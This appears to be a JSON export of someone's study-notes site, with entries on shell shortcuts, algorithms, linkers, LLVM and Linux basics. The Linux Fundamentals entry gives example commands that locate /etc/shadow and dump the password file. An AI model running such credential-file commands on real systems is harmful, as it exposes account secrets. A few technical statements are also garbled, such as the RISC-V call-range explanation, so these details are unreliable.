jump by words to correct a typo or \"run again\" with minor changes to last command.  Ctrl as modifier might also work on mac and non-mac keyboards/shells/apps.\nDelete previous word (in shell) | `Ctrl` + `W` | It's faster to delete by words.  Especially when your last command was wrong by a single typo or something.\nClear screen | `Ctrl` + `L` | This is telling the shell to do it instead of an explicit command like `clear` or `cls` in DOS.  If you use `⌘` + `K`, this is telling iTerm to clear the screen which might have the same result or do something terrible (like when using a TUI like `top` or `htop`.  In general, use this instead of typing `clear` over and over.\nExit Shell | `Ctrl` + `D` | Instead of typing exit, just get this in muscle memory.  It works in many contexts.\n\n\n\n## Moving Faster\n\nA lot of shell shortcuts work in iTerm2 and it's good to learn these because arrow keys, home/end\nkeys and Mac equivalents don't always work.  For example `⌘` + `Left Arrow` is usually the same as `Home`\n(go to beginning of current line) but that doesn't work in the shell.  Home works in many apps but it\ntakes you away from the home row.\n\n**Function** | **Shortcut**\n-------- | --------\nMove to the start of line | `Ctrl` + `A` or `Home`\nMove to the end of line | `Ctrl` + `E` or `End`\nMove forward a word | `Option` + `F`\nMove backward a word | `Option` + `B`\nSet Mark | `⌘` + `M`\nJump to Mark | `⌘` + `J`\nMoving by word on a line (this is a shell thing but passes through fine)| `Ctrl` + `Left/Right Arrow`\nCursor Jump with Mouse (shell and vim - might depend on config) | `Option` + `Left Click`\n\n\n## Copy and Paste with iTerm without using the mouse\n\nI don't use this feature too much.  I instead just mouse select (which copies to the clipboard) and paste.  There's no need to Copy to the clipboard if you have `General \u003e Selection \u003e Copy to pasteboard on selection` enabled.\n\n**Function** | **Shortcut**\n-------- | --------\nEnter Copy Mode | `Shift` + `⌘` + `C`\nEnter Character Selection Mode in Copy Mode | `Ctrl` + `V`\nMove cursor in Copy Mode | `HJKL` vim motions or arrow keys\nCopy text in Copy Mode | `Ctrl` + `K`\n\nCopy actions goes into the normal system clipboard which you can paste like normal.\n\n\n## Search the Command History\n\nSome of these are not directly related to iTerm and are just \"shell features\".  Like, if you open Terminal.app on Mac some of these still work because it's the shell and not iTerm.  I'm including them anyway.\n\n**Function** | **Shortcut**\n-------- | --------\nSearch as you type | `Ctrl` + `R` and type the search term; Repeat `Ctrl` + `R` to loop through result\nSearch the last remembered search term | `Ctrl` + `R` twice\nEnd the search at current history entry  | `Ctrl` + `Y`\nCancel the search and restore original line | `Ctrl` + `G`\n\n## Misc\n\n**Function** | **Shortcut**\n-------- | --------\nClear the screen/pane (when `Ctrl + L` won't work) | `⌘` + `K`  (I use this all the time)\nBroadcast command to all panes in window (nice when needed!) | `⌘` + `Alt` +  `I` (again to toggle)\nFind Cursor | `⌘` + `/`  _or use a theme or cursor shape that is easy to see_\n\n---\nSource: [GitHub - squarism](https://gist.github.com/squarism/ae3613daf5c01a98ba3a)\n",
    "lastmodified": "2022-11-24T12:20:59.970015168Z",
    "tags": null
  },
  "/notes/general/jump-table": {
    "title": "Jump Table",
    "content": "# Jump Table\n---\nIt can either be an array of pointers to functions or an array of machine code jump instructions. \n\nIf you have a relatively static set of functions, for example system calls, then you can create a table once and call the functions using a simple index into the array. This means retrieving the pointer and calling a function or jumping to the machine code depending on the type of table used.\n\nThe benefits are:\n- Indexes are more memory efficient than MC or pointers.\n- The index will remain stable and changing the function is as simple as swapping out the function pointer.\n\nIt is kind of like a **switch** statement:\n\n```c\nJT(int c)\n{\n   switch(state)\n   {\n      case 0:\n         goto func0label;\n      case 1:\n         goto func1label;\n      case 2:\n         goto func2label;\n   }\n}\n```",
    "lastmodified": "2022-11-24T12:21:00.080060124Z",
    "tags": null
  },
  "/notes/general/knowledge-hub": {
    "title": "Knowledge Hub",
    "content": "# Knowledge Hub\n\nWhere all of my notes live!!! There are no rules here 😎\n\n\u003ccenter\u003e\u003cimg src=\"https://c.tenor.com/xsFziU-YrVoAAAAd/shaman-king-yoh-asakura.gif\"\u003e\u003c/center\u003e\n\n---\n## General\n[HELP](notes/general/help.md) - very useful shortcuts for Vim, Obsidian (and plugins), tmux etc and general help.\n\n## Computer Science\n- [Algorithms and Data Structure](notes/general/algorithms-and-data-structure.md)\n- [Formal Languages](notes/general/formal-languages.md)\n\n### Computer Architecture\n- [ISA (Instruction Set Architecture)](Instruction%20Set%20Architecture))\n- [Instruction Set Semantics](notes/general/instruction-set-semantics.md)\n\n### Toolchain\n#### Compilers\n- [Compilers](notes/general/compilers.md)\n- [Sysroot](notes/general/sysroot.md)\n- [Compiler Toolchains](notes/general/compiler-toolchains.md)\n- [GCC Guide by Maxim](notes/private/work/gcc-guide-by-maxim.md)\n\n#### Linker\n- [Linker](notes/general/linker.md)\n- [Relocations](notes/general/relocations.md)\n- [HowTo Table](notes/general/howto-table.md)\n\n#### Assembler\n- [RISC-V Assembler](notes/general/riscv-assembler-reference.md)\n\n### Cybersecurity\n- Files Transfers ([here](notes/general/htb-file-transfers.md))\n- Netcat ([here](notes/general/netcat.md))\n- Stack-based Buffer Overflows on Linux x86 ([here](notes/general/htb-stack-based-overflow-linux.md))\n- Introduction to Networking [here](notes/general/htb-intro-networking.md)\n- [HTB Notes](notes/general/hackthebox.md)\n- [THM - Encryption 101](notes/general/thm-encryption101.md)\n- [THM - Metasploit](notes/general/thm-metasploit.md)\n\n### Not sure where to put these :)\n- [Source Code Optimisation](notes/general/source-code-optimisation.md)\n- [Embedded Applications](notes/general/embedded-applications.md)\n- [Debugging Techniques](notes/general/debugging-techniques.md)\n- [Blockchain](notes/general/blockchain.md)\n- [The C Language](notes/general/c-language.md)\n\n#### RISC-V\n- [RISC-V](notes/general/riscv.md)\n",
    "lastmodified": "2022-11-24T12:21:00.097270012Z",
    "tags": null
  },
  "/notes/general/kruskals-algorithm": {
    "title": "Kruskal's Algorithm",
    "content": "# Kruskal's Algorithm\n---\nIt is a [minimum spanning subtree](notes/general/minimum-spanning-tree.md) algorithm.\n\nIt performs well for sparse [graphs](notes/general/graphs.md) due to simple data structures: $O_(E\\ log\\ N)$.\n\nThe way it works:\n1. Choose the shortest edge.\n2. Choose the next shortest edge, ensure it does not form a cycle in the subtree formed so far. If a cycle is formed, discard the edge.\n3. Repeat step 2 until there are $(N-1)$ edges in the subtree.\n\n![kruskals](notes/images/kruskals.png)\n\n## See also\n- [Minimum Spanning Subtree](notes/general/minimum-spanning-tree.md)\n- [Trees](notes/general/trees.md)\n- [Graphs](notes/general/graphs.md)\n- [Big O Notation](notes/general/big-o-notation.md)\n- [Pimm's](notes/general/prims-algorithm.md)\n",
    "lastmodified": "2022-11-24T12:21:00.181375384Z",
    "tags": null
  },
  "/notes/general/lexical-analysis": {
    "title": "Lexical Analysis",
    "content": "# Lexical Analysis\n---\nIt is the process of grouping individual characters into basic entities, known as **tokens** or **lexemes**.\n\nExamples: integer, variable, addition operator.\n\nThe **lexical analyser** (aka scanner) takes a source file and produces a stream of tokens, error messages and diagnostics.\n\nHere you can see a [parse tree](notes/general/parse-trees.md) with lexing:\n![parse-tree-lexing](notes/images/parse-tree-lexing.png)\n\n## Grammars for lexical analysis\nRelated to [Formal Languages](notes/general/formal-languages.md).\n\nType 3 grammar for **binary numbers**:\n\n- integer $\\rightarrow$ 0 | 1 | integer0 | integer 1\n\nDerived from the trivially equivalent but clearer type 2 grammar:\n\n- integer $\\rightarrow$ digit | integer digit\ndigit $\\rightarrow$ 0 | 1\n\nTypical tokens:\n\n| Type     | Description                   | Example        |\n| -------- | ----------------------------- | -------------- |\n| integer  | string of decimal digits      | 1729, 561, 0   |\n| variable | string starting with a letter | loopvar, t1, x |\n| operator | one of +, -, * or /           | +, /           |\n| VAR      | the letters V, A, R           | VAR               |\n\n## Symbol Tables\nThey are used throughout the [compiler](notes/general/compilers.md) to build information about symbols:\n\n```c\nstruct symbtab\n{\n  char *name;\n  int type;\n  int blockno;  /* Block where declared */\n  int addr;\n}\n```\n",
    "lastmodified": "2022-11-24T12:21:00.18786335Z",
    "tags": null
  },
  "/notes/general/linear-equations": {
    "title": "Linear Equations",
    "content": "# Linear Equations\n---\nThe basic representation is: \n$$\\begin{align*}\n  \\begin{pmatrix} a_{11} \u0026 a_{12}\\\\\\ a_{21} \u0026 a_{22} \\end{pmatrix}\n  \\begin{pmatrix} x_1\\\\\\ x_2 \\end{pmatrix}\n  = \\begin{pmatrix} b_1\\\\\\ b_2 \\end{pmatrix}\n\\end{align*}$$\n\n- Solution by elimination is $n^3$ and program for specific matrix types can be written (Gustus, Lunger and Willerby).\n\nConsider:\n\n$$\\begin{align*}\n  \\begin{pmatrix} a_{11} \u0026 a_{12} \u0026 \\color{red}{a_{13}}\\\\\\ \\color{red}{a_{21}} \u0026 a_{22} \u0026 \\color{red}{a_{23}}\\\\\\ a_{31} \u0026 \\color{red}{a_{32}} \u0026 a_{33}\\end{pmatrix}\n  \\begin{pmatrix} x_1\\\\\\ x_2\\\\\\ x_3 \\end{pmatrix}\n  = \\begin{pmatrix} b_1\\\\\\ b_2\\\\\\ b_3 \\end{pmatrix}\n\\end{align*}$$\n\n- Note that entries in red are **always** zero.\n\n```c\np[1] = a[1][1]\np[2] = a[1][2]\np[3] = a[2][2]\np[4] = a[3][1]\np[5] = a[3][3]\np[6] = b[1]\np[7] = b[2]\np[8] = b[3]\n```\n\n## Custom Program\n```c\n// Elim a[2][1] from eqn 2 by subtracting multiple of eqn 1\n// - but a[2][1] is already 0\n// Elim a[3][1] from eqn 3 by subtracting multiple of eqn 1\nq = p[4] / p[1];\np[4] = -q * p[2];          // p[4] now refers to a[3][2]\np[8] = p[8] - q * p[6];    // x[1] now eliminated\n// Elim a[3][2]\nq = p[4] / p[3];\np[8] = p[8] - q * p[7];\n// Elimination complete\nx[3] = p[8] / p[5];\nx[2] = p[7] / p[3];\np[6] = p[6] - x[2] * p[2];\nx[1] = p[6] / p[1];\n```\n\nAfter elimination stage the matrix is:\n$$\\begin{align*}\n  \\begin{pmatrix} a_{11} \u0026 a_{12} \u0026 0\\\\\\ 0 \u0026 a_{22} \u0026 0\\\\\\ 0 \u0026 0 \u0026 a_{33}\\end{pmatrix}\n\\end{align*}$$\n## Diagonalisation\nGaussian elimination aims to create an upper-triangular matrix, start by swapping rows and columns.\n\nConsider:\n$$ \\begin{pmatrix}\n0 \u0026 a_{12} \u0026 0 \u0026 a_{14} \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 a_{23} \u0026 0 \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 a_{36} \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 a_{45} \u0026 0 \\\\\n0 \u0026 0 \u0026 a_{53} \u0026 0 \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 a_{66} \n\\end{pmatrix}  $$\n\nUse pivot of column 2, row 2, swapping with column 5 and row 4:\n$$ \\begin{pmatrix}\n0 \u0026 a_{12} \u0026 0 \u0026 a_{14} \u0026 0 \u0026 0 \\\\\n0 \u0026 a_{45} \u0026 a_{23} \u0026 0 \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 a_{36} \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 a_{53} \u0026 0 \u0026 0 \u0026 0 \\\\\n0 \u0026 0 \u0026 0 \u0026 0 \u0026 0 \u0026 a_{66} \n\\end{pmatrix}  $$\nTry all possible pivots, choosing the one which will leave the array sparset. \n\n## See Also\n- [](notes/general/algorithms-and-data-structure.md#Mathematical%20Algorithms%7CMathematical%20Algorithms)",
    "lastmodified": "2022-11-24T12:21:00.209003806Z",
    "tags": null
  },
  "/notes/general/linear-knapsack-problem": {
    "title": "Linear Knapsack Problem",
    "content": "# Linear Knapsack Problem\n---\nAlso known as the **stock cutting** problem.\n\nConsider capacity 100, and object of size {53, 53, 49, 49, 3}.\n\n- **Greedy** algorithm: start with largest object - 47% wastage.\n- **Miserly** algorithm: start with smallest object - 48% wastage.\n- **Heuristic** algorithm: for each object try using that object and **greedy** on rest - 2% wastage.\n\n    - {**53**, 3} →  44% wastage\n    - {**53**, 3}  →  44% wastage\n    - {**49**, 49}  →  2% wastage\n    - {**49**, 49}  →  2% wastage\n    - {**3**, 53}  →  44% wastage\n\n## Heuristic Algorithms\nThe first two algorithms have up to 50% wastage. The worst case for heuristic algorithm is with {35, 35, 33, 33, 33} which means **70%** wastage.\n\nGeneralise to:\n```c\nfor each set of k objects\n  use k objects\n  use greedy on the rest\n```\n\nWorst case efficiency is $(k+1)/(k+2)$, in practic k = 2 is sufficient.\n\n## See also\n- [Problems](notes/general/cs-problems.md)",
    "lastmodified": "2022-11-24T12:21:00.225082278Z",
    "tags": null
  },
  "/notes/general/linker": {
    "title": "Linker",
    "content": "# Linker\n---\nOfficial documentation: https://sourceware.org/binutils/docs/ld/\n\nThe linker combines a number of object and archive files, relocates their data and ties up symbol references.\n\nWhen one object file references functions or variables, which do not exist within the file's context but exist in other object files (dependencies) then they must be linked. \n\nLinking allow the use of separate, independent sources of code by providing a way to merge the code together in a single file, meaning the developer is spared of the low-level detail.\n\nFor example:\n\n```c\n#include \u003cstdio.h\u003e\n\nvoid main() {\n    printf(\"Hello mum!\");\n}\n```\n\nHere we don't implement the `printf` function, we link our file, `file.o`, against `printf.o` which is imported from `stdio.h`. It is important to notice that we import the definition of `printf` not the implementation.\n\n```toc\n```\n\n## Linker Script\nEvery link is controller by a **linker script** which can be seen by running:\n\n```bash\nriscv32-unkown-elf-ld --verbose\n```\n\nEach section in an object file has a name and size. Most sections also have an associated block of data, known as the **section contents**.\n\nA section may be marked as **loadable** or **allocatable** (meaning memory needs to be set aside, but nothing to load).\n\nEvery loadable or allocatable output section has two addresses: the **VMA** (virtual memory address) and the **LMA** (load memory address).\n\n- VMA: address the section will have when the output file is run.\n- LMA: address at which the section will be loaded.\n\nIn most cases both are the same.\n\nTo see the sections of a program:\n\n```bash\nriscv32-unknown-elf-objdump -h \u003cfile\u003e\n```\n\nTo see the symbols:\n\n```bash\nnm # OR\nriscv32-unknown-elf-objdump -t \u003cfile\u003e\n```\n\n## Symbols\nWhen a symbol is declared, two things happen:\n\n1. The compiler reserves enough space in the program's memory to hold the **value** of the symbol.\n2. The compiler creates an entry in the program's symbol table which holds the symbol's **address** (block of memory holding the symbol's value).\n\nFor example if we have:\n\n```c\nint foo = 1000;\n```\n\nIt creates an entry called `foo` in the symbol table, which holds the address of an `int` sized block of memory where the number 1000 is initially stored.\n\nSymbolic references get translated into offsets and addresses during compilation. However, this doesn't only happen during machine code generation, it can also be exported from **source code**. This is done to improve the interpretation of the generated machine code.\n\nThe linker interacts with a symbol table to reference/modify/match a given symbol inside and ELF object at linktime.\n\nIn ELF, each symbol is represented as an instance of an `Elfxx_Sym` structure inside a given [**symbol table**](notes/general/plt-and-got.md). (To retrieve them we use bitmasks).\n\nAn ELF object may contain a maximum of two **symbol tables**: `.symtab` and `.dynsym`. `.symtab` is the binary's global symbol table. The `.dynsym` holds symbols needed for **dynamic linking** (external objects, shared objects).\n\n![Pasted image 20220802095635](notes/images/Pasted%20image%2020220802095635.png)\n\nHere you can see the binary contains the symbol `_IO_stdin_used`, which is the second `Elf32_Sym` instance in `.dynsym`. The `.dynsym` section is represented as an `Elf32_Shdr` structure, and the index of its **string table** within the **section header** table can be retrieved by its `Elf32_Shdr` link field.\n\nMoreover, the symbol resides within the `.rodata` section as shown by its `Elf32_Sym` `st_shndx` field, fourth instance within `Elf32_Shdr`.\n\nTherefore, we can obtain `_IO_stdin_used` attributes based on its `Elf32_Sym` instance.\n\n`st_value` -\u003e contains a virtual address denoting the symbol's location within its correspondent section, but not the actual value of the symbol.\n\n- **Local variables** go in the stack.\n- **Dynamically allocated memory** is taken from the **heap**, and then the **malloc** function keeps track of where all the available space is this area is.\n\nTherefore, the stack grows towards the heap so we only run out of memory if they meet in the middle.\n\n### Duplicate Symbols\nIn C++, we have a constraint known as the **one definition rule** which says that there has to be exactly one definition for a symbol when it comes to link time.\n\nIn C, there has to be exactly one definition of any functions or initialised global variables, but the definition of an uninitialised global variable can be treated as a **tentative definition**. C then allows different source files to have tentative definitions of the same object.\n\nIt is common for UNIX linkers to **not** complain about duplicate definitions of symbols are they have to cope with other programming languages than just C and C++.\n\n### Referencing Symbols\nWhen a program references a symbol, the compiler generates code to first access the symbol table to find the address of that symbol's memory block and then code to read the value from that memory block, so:\n\n```c\nfoo = 1;\n```\n\nLooks up the symbol `foo` in the symbol table, gets the address associated with the symbol and then writes the value 1 into that address. Whereas:\n\n```c\nint * a = \u0026 foo;\n```\n\nLooks up the symbol `foo` in the symbol table, gets it address and then copies this address into the block of memory associated with the variable `a`.\n\n**Linker scripts** symbol declarations create an entry in the symbol table but do not assign any memory to them. Thus they are an address without a value, for example:\n\n```c\nfoo = 1000;\n```\n\nCreates an entry in the symbol table called `foo` which holds the address of memory location 1000, but nothing is stored there. This means that you cannot access the **value** of a linker script defined symbol, all you can do is access the **address**.\n\nHence we should always take the address of the symbol, and never attempt to use its value.\n\n## Static Linking\n![Pasted image 20220802105128](notes/images/Pasted%20image%2020220802105128.png)\n\n**Ld** collects all relevant object files, applies [relocations](notes/general/relocations.md) and combines the file into a single binary.\n\n### Static Libraries\nThe command to produce them is normally `ar`, and the library file has a `.a` extension. These files are normally also prefixed with `lib` and passed to the linker with a `-l` option followed by the name of the library (so `-lfred` will pick up `libfred.a`).\n\nLibraries are consulted **only** when the normal linking is done and they are processed in order, left to right. This means that if an object pulled in from a library late in the link line needs a symbol from a library earlier in the link time, the linker won't automatically find it.\n\n## Dynamic Linking\nIt requires **shared** libraries to create a dynamically linked executable. The output file will contain the executable's code and the names of the shared libraries required, embedded within the binary:\n\n![Pasted image 20220802105245](notes/images/Pasted%20image%2020220802105245.png)\n\nSo when the binary is executed, we find the required dependencies to load and link together. Therefore, we defer the linking stage from compile-time to run-time.\n\nMore details here: https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/\n\n### Shared Libraries\nA disadvantage of **static** linking is that the code in the program is fixed forever, if someone finds a bung in `printf`, then every program has to be linked again in order to pick up the fixed code.\n\nIf the linker finds that the definition for a particular symbol is in a shared library, then it doesn't include the definition of that symbol in the final executable. Instead, it records the name of the symbol and which library it is supposed to come from in the executable file instead.\n\nBefore the `main` function is run, a smaller version of the linker (`ld.so`) goes through the \"promissory notes\" and does the last stage of the link there and then.\n\nIf a particular symbol is pulled in from a particular shared library (`printf` in `libc.so` for example), then the whole of that shared library is mapped into the address space of that program. This is very different from the behaviour of a static library, where only the particular objects that held undefined symbols got pulled in.\n\n## Related Notes\n- [Relocations](notes/general/relocations.md)\n- [PLT and GOT](notes/general/plt-and-got.md)\n- [Howto Table](notes/general/howto-table.md)\n- [Linker Relaxation](notes/general/linker-relaxation.md)\n- [Jump Table](notes/general/jump-table.md)",
    "lastmodified": "2022-11-24T12:21:00.312557578Z",
    "tags": null
  },
  "/notes/general/linker-relaxation": {
    "title": "Linker Relaxation",
    "content": "# Linker Relaxation\n---\nHow the linker optimises instructions for the compiler by having a second relaxation.\n\n## Example\n ```bash\n$ cat test.c\nint func(int a) __attribute__((noinline));\nint func(int a) {\n  return a + 1;\n}\n\nint _start(int a) {\n  return func(a);\n}\n$ riscv64-unknown-linux-gnu-gcc test.c -o test -O3\n$ riscv64-unknown-linux-gnu-objdump -d -r test.o\ntest.o:     file format elf64-littleriscv\nDisassembly of section .text:\n\n0000000000000000 \u003cfunc\u003e:\n   0:   2505                    addiw   a0,a0,1\n   2:   8082                    ret\n\n0000000000000004 \u003c_start\u003e:\n   4:   00000317                auipc   ra,0x0\n                        4: R_RISCV_CALL func\n                        4: R_RISCV_RELAX        *ABS*\n   8:   00030067                jr      ra\n ```\n\nHere you can see the relocation `R_RISCV_CALL` between `auipc` and `jalr` (`jr` as shorthand), and it **points** to the symbol that should be the target of the jump, in this case the **func** symbol. You can see how it is paired with the `R_RISCV_RELAX` relocation.\n\nIn RISC-V, there are two unconditional control transfer instructions: `jalr`, which jumps to an absolute address as specified by an immediate offset from a register; and `jal`, which jumps to a pc-relative offset as specified by an immediate. The only difference between the `auipc+jalr` pair and `jal` are that the pair can only address a 21-bit signed offset from the current PC, and that the `jal` instruction is half the size.\n\nThe compiler doesn't know if the offset between `_start` and `func` will fit within that range, so it is forced to generate the longer call. Because we don't want to impose this cost in cases where it is not necessary, we optimise it in the linker. This is a result of a linker relaxation:\n\n```bash\n$ riscv64-unknown-linux-gnu-objdump -d -r test\ntest:     file format elf64-littleriscv\n\nDisassembly of section .text:\n\n0000000000010078 \u003cfunc\u003e:\n   10078:       2505                    addiw   a0,a0,1\n   1007a:       8082                    ret\n\n000000000001007c \u003c_start\u003e:\n   1007c:       ffdff06f                j       10078 \u003cfunc\u003e\n```\n\nAs you can see, the linker knows that the call from `_start` to `func` fits within the 21-bit offset of the `jal` instruction and converts it to a single instruction.\n\n## Source\n- All Aboard, Part 3: Linker Relaxation in the RISC-V Toolchain ([here](https://www.sifive.com/blog/all-aboard-part-3-linker-relaxation-in-riscv-toolchain))\n\n---\n## Related Notes\n- [2022-07-03 - Relaxation](notes/daily/2022-07-03-relaxation.md)\n- [Testing Relaxation - COREV](notes/daily/testing-relaxation-corev.md)\n- [Fixups](notes/general/fixups.md)",
    "lastmodified": "2022-11-24T12:21:00.274623156Z",
    "tags": null
  },
  "/notes/general/linux-fundamentals": {
    "title": "Linux Fundamentals",
    "content": "# Linux Fundamentals\n---\n\nBunch of old notes on Linux stuff.\n\n## Find command\n\n``` \n\t-type f -\u003e type: file\n\n\t-name *.conf -\u003e all files owned by root\n\n\t-size +20k -\u003e larger than 20KiB\n\n\t-exec ls -al {} \\ -\u003e executes the specified command* \n\n\t2\u003e/dev/null -\u003e STDERR redirection to the null device\n\n\t-newermt 2020-03-03 -\u003e newer than this date\n```\n\n* the backlash escapes the next character from being interpreted by the\n  shell, otherwise the semicolon would terminate the command too soon.\n\n## File Descriptors\n\nThe file descriptor is an indicator of connection maintained by the kernel to\n\nperform Input/Output (I/O) operations.\n\n1. Data Stream for Input\n\t* STDIN - 0\n\n2. Data Stream for Output\n\t* STDOUT - 1\n\n3. Data Stream for Output that relates to an error occurring\n\t* STDERR - 2\n\nRedirect STDOUT to a File\n\n`find /etc/ -name shadow 2\u003e/dev/null \u003e results.txt`\n\nRedirect STDOUT and STDERR to different files\n\n`find /etc/ -name shadow 2\u003e stderr.txt 1\u003e stdout.txt`\n\nRedirect STDIN\n\n`cat \u003c stdout.txt`\n\nRedirect STDOUT and Append to a File\n\n```\nfind /etc/ -name passwd \u003e\u003e stdout.txt 2\u003e/dev/null\ncat stdout.txt\n```\n\nRedirect STDIN Stream to a File\n\n```\ncat \u003c\u003c EOF \u003e stream.txt\ncat stream.txt\n```\n\nPiping\n\n`find /etc/ -name *.conf 2\u003e/dev/null | grep systemd | wc -l`\n\nWe can sort output with:\n\n`cat /etc/passwrd | sort`\n\n## Permission\n\n- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd\n\n```\n---- --- ---   |  |    |    |   |__________|\n|  |   |   |    |  |    |    |        |_ Date\n|  |   |   |    |  |    |    |__________ File Size\n|  |   |   |    |  |    |_______________ Group\n|  |   |   |    |  |____________________ User\n|  |   |   |    |_______________________ Number of hard links\n|  |   |   |_ Permission of others (read)\n|  |   |_____ Permissions of the group (read, write)\n|  |_________ Permissions of the owner (read, write, execute)\n|____________ File type (- = File, d = Directory, l = Link, ... )\n```\n\nr -\u003e read\n\nw -\u003e write\n\nx -\u003e execute\n\nPermissions can be modified using the `chmod` command (`u` - owner, `g`\n\n- Group, `o` - others, `a` - All users) with either a [`+`] or [`-`] to add or\n\nremove permissions.\n\nExample apply read permissions to all users:\n\n`chmod a+r shell \u0026\u0026 ls -l shell`\n\nTo change owner:\n\n`chown \u003cuser\u003e:\u003cgroup\u003e \u003cfile/directory\u003e`\n\n### SUID and GUID\n\nSet User ID (SUID) and Set Group ID (GUID)\n\nThey allow, for example, users to run programs with the rights of another user.\n\nAdministrators often use it to give their user special rights to certain app or\n\nfile.\n\n## Shortcuts\n\n`[CTRL] + A` -\u003e move to beginning of the line\n`[CTRL] + E` -\u003e move to end of the line\n\n`[CTRL] + U` -\u003e erase everything from current position of the cursor to\nbeginning of the line\n`[CTRL] + K` -\u003e delete to the end of line\n\n`[CTRL] + Y` -\u003e pastes erased word\n\n`[CTRL] + L` -\u003e clear terminal",
    "lastmodified": "2022-11-24T12:21:00.325234652Z",
    "tags": null
  },
  "/notes/general/lists": {
    "title": "Lists",
    "content": "# Lists\n---\nA **list** is a sequence of zero or more data items, with the total number of items being the **length** of the list.\n\nIt can grow and shrink on demand and items can be accessed, inserted or deleted at any position.\n\n![lists](notes/images/lists.png)\n\n---\n## Types of Lists\n- [Arrays](notes/university/arrays.md)\n- [Linked List](notes/university/linked-list.md)\n- [Stack](notes/general/stack.md)\n- [Queue](notes/university/queue.md)\n- [Hash Tables](notes/general/hash-tables.md)\n\n## Lists in C\n```c\nstruct elem {\n  struct elem *next;\n  int val;\n};\n```\n\n```c\nstruct elem\n  struct elem *next;\n  struct elem *head;\n  int val;\n};\n```\n\n```c\nstruct elem *head = NULL;\nstruct elem *tail = NULL;\n```\n## Applications\n- Often used to implement other data structures e.g. [queue](notes/university/queue.md)s and [stack](notes/general/stack.md)s  \n- Used for mathematical vectors and matrices\n",
    "lastmodified": "2022-11-24T12:21:00.352316618Z",
    "tags": null
  },
  "/notes/general/llvm": {
    "title": "LLVM",
    "content": "# LLVM \n---\nThe LLVM Project is a collection of modular and reusable [compiler](notes/general/compilers.md) and toolchain technologies. Prebuilt binaries of the LLVM toolchain can be downloaded from the [LLVM Download Page](https://releases.llvm.org/download.html). The toolchain can also be built from source by following the instructions from their [documentation page](https://llvm.org/docs/). The toolchain contains the following top-level directories:\n\n```bash\nbin include lib libexec share\n```\n\nThe `bin` folder contains all the executable binaries, like the clang [compiler](notes/general/compilers.md) and a set of other useful tools such as clang-rename, clang-refactor, etc.\n\nThe `include` folder contains a set of header files that are included during compilation. For example, the C++ header files like iostream, etc. Notice that the C header files like `stdio.h` are not supplied with the toolchain because they are part of the [sysroot](notes/general/sysroot.md). It also contains header files that are used when using the llvm libraries to build tools.\n\nThe `lib` folder contains libraries like libc++, libc++abi, etc. These libraries may be used by the clang [compiler](notes/general/compilers.md) during the compilation process or can be used as a reusable set of libraries.\n\nThe `libexec` folder contains two Python scripts that are only relevant for using the clang static analyser.\n\nThe `share` folder contains the documentation which can be installed as _man_ pages and a non-essential set of scripts.\n\n## Three-phase design\nFront end, optimiser and back end (as most C compilers).\n\n- Front end: parses source code, checking it for errors and builds a language-specific Abstract Syntax Tree (AST) to represent the input code. The AST is optionally converted to a new representation for optimisation, and the optimiser and back end are run on the code.\n\n![three-phase-compiler](notes/images/three-phase-compiler.png)\n\n- Optimiser: responsible for transforming the code to improve running time, for example by eliminating redundant computations, and it is usually more of less independent of language and target.\n\n- Back end: aka code generator, maps the code onto the target instruction set. It is also responsible for generating good code that takes advantage of the unusual features of the supported architecture. Common parts of a compiler back end are: instruction selection, register allocation and instruction scheduling.\n\nThe most important win of this classical design comes when a compiler decides to support multiple source languages or target architectures. If the compiler uses a common code representation in its optimiser, then a front end can be written for any language that can compile to it, and a back end can be written for any target that can compile from it (as seen bellow).\n\n![retargetability](notes/images/retargetability.png)\n\n## LLVM Intermediate Representation (IR)\nIs the form LLVm uses to represent code in the compiler. It is designed to host mid-level analyses and transformations that can be found in the optimisation phase.\n\nIt was designed with many specific goals in mind, including supporting lightweight runtime optimisation, cross-function/inter-procedural optimisations, whole program analyses and aggressive restructuring transformations. \n\nThe most important aspect however, is that it is itself defined as a first class language with well-defined semantics. Here is a simple example of a `.ll` file:\n\n```LLVM\ndefine i32 @add1(i32 %a, i32 %b) {  \nentry:  \n    %tmp1 = add i32 %a, %b  \n    ret i32 %tmp1  \n}  \ndefine i32 @add2(i32 %a, i32 %b) {  \nentry:  \n    %tmp1 = icmp eq i32 %a, 0  \n    br i1 %tmp1, label %done, label %recurse  \nrecurse:  \n    %tmp2 = sub i32 %a, 1  \n    %tmp3 = add i32 %b, 1  \n    %tmp4 = call i32 @add2(i32 %tmp2, i32 %tmp3)  \n    ret i32 %tmp4  \ndone:  \n    ret i32 %b\n```\n\n- Which corresponds to this C code:\n\n```c\nunsigned add1(unsigned a, unsigned b) {\n  return a + b;\n}\n\nunsigned add2(unsigned a, unsigned b) {\n  if (a == 0) {\n    return b;\n  }\n\n  return add2(a - 1, b + 1);\n}\n```\n\nAs you can see, the instructions (in LLVM IR) are in [three address form](notes/general/three-address-code.md), which means they take some number of inputs and produce a result in a different register.\n\nIt also does not use a fixed set of named registers, it uses an infinite set of temporaries named with a `%` character.\n\nBeyond being implemented as a language, LLVM IR is actually defined in three isomorphic forms: the textual format above, an in-memory data structure inspected and modified by optimisations themselves, and an efficient and dense on-disk binary “bitcode” format. The LLVM Project also provides tools to convert the on-disk format from text to binary: llvm-as assembles the textual .ll file into a .bc file containing the bitcode goop and llvm-dis turns a .bc file into a .ll file.  \n\nThe intermediate representation of a compiler is interesting because it can be a “perfect world” for the compiler optimiser: unlike the front end and back end of the compiler, the optimiser isn’t constrained by either a specific source language or a specific target machine. On the other hand, it has to serve both well: it has to be designed to be easy for a front end to generate and be expressive enough to allow important optimisations to be performed for real targets\n\n## LLVM's Target Description Files: .td\nEach shared component needs to be able to reason about target specific properties in a generic way. For example, a shared register allocator needs to know the register file of each target and the constraints that exist between instructions and their register operands.\n\nLLVM's solution to this is for each target to provide a **target description** in a declarative domain-specific language (a set of `.td` files) processed by the **tblgen** tool. Here is the build process for the x86 